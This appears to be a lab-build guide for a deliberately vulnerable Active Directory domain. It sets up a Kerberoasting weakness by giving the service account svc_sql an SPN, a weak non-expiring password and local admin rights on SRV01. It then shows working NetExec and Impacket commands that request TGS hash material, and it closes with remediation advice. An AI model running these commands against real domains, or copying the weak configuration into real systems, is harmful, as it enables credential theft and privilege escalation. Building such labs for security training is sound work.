# Vulnerability 01 - Kerberoasting

## Objective
Create a service account with an SPN and a weak lab password, then validate that a low-privileged domain user can obtain Kerberos service-ticket material for offline testing.

## Intended path

```text
jwilson
   |
   v
Request TGS
   |
   v
svc_sql
   |
weak password
   |
   v
SRV01 local administrator
```

## Configure on DC01

```powershell
setspn -S MSSQLSvc/SRV01.hznlab.local:1433 HZNLAB\svc_sql

Set-ADAccountPassword `
  -Identity "svc_sql" `
  -Reset `
  -NewPassword (ConvertTo-SecureString "Summer2026!" -AsPlainText -Force)

Set-ADUser svc_sql -PasswordNeverExpires $true
```

Verify:

```powershell
Get-ADUser svc_sql `
  -Properties ServicePrincipalName,PasswordNeverExpires |
  Select SamAccountName,ServicePrincipalName,PasswordNeverExpires
```

## Give svc_sql impact on SRV01

```powershell
Add-LocalGroupMember `
  -Group "Administrators" `
  -Member "HZNLAB\svc_sql"
```

## Validate from Kali

NetExec:

```bash
nxc ldap 10.10.10.10 \
  -u jwilson \
  -p 'HznLab2026!' \
  --kerberoasting kerberoast.txt
```

Impacket:

```bash
impacket-GetUserSPNs \
  hznlab.local/jwilson:'HznLab2026!' \
  -dc-ip 10.10.10.10 \
  -request \
  -outputfile kerberoast-impacket.txt
```

Expected material begins with:

```text
$krb5tgs$23$
```

## Why it matters
The issue is the combination of an SPN-bearing user account, weak/long-lived service credentials, and excessive host privilege.

## Remediation
Use strong randomly generated service credentials, rotate them, prefer gMSAs where practical, and minimize service-account privileges.
